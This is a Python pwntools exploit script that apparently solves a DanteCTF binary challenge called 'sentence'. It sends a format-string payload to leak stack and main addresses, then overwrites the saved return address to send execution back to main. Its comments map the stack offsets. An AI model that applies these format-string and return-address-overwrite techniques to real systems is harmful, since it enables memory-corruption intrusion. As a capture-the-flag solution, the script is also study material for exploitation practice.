#!/usr/bin/env python3

from pwn import *
from re import match

exe = ELF("./sentence")
context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            gdb.attach(r)
    else:
        r = remote("challs.dantectf.it/tcp", 31531)

    return r


def main():
    r = conn()

    # SOME INFOs
    # %06$lx    --->    first stack value
    # %07$lx    --->    Stack value to move into rdx (used as index to access the stack itself)
    # %08$lx    --->    Stack value to move into rax (used to write into stack[rdx])
    # %09$lx    --->    canary value
    # %08$lx    --->    
    # %11$lx    --->    RET address
    # %12$lx    --->    256 bytes higher pointer than the RBP
    # %13$lx    --->    Address of the first instruction for main
    # EXTRA:    Format string located 432 bytes lower than the first stack value

    # %lx-%13$lx
    
    # Leak stack address and "main" function address
    # For the stack address, performs a small calculation to retrieve the RSP value
    payload = '%12$p-%13$p'
    r.sendlineafter('name: \n', payload)

    matched_output = match(r'Hi, (.+)-(.+) give me a soul you want to send to hell: \n', r.recvlineS())
    rsp_addr = int(matched_output.group(1), 16) - 0x100 - 0x20
    main_addr = int(matched_output.group(2), 16)

    print(hex(rsp_addr), hex(main_addr))

    payload = str(main_addr)
    r.sendline(payload)

    # payload = str(rsp_addr + 0x28)     # RET value
    payload = str(rsp_addr + 0x8)     # RET value
    r.sendlineafter('her: \n', payload)

    r.interactive()


if __name__ == "__main__":
    main()
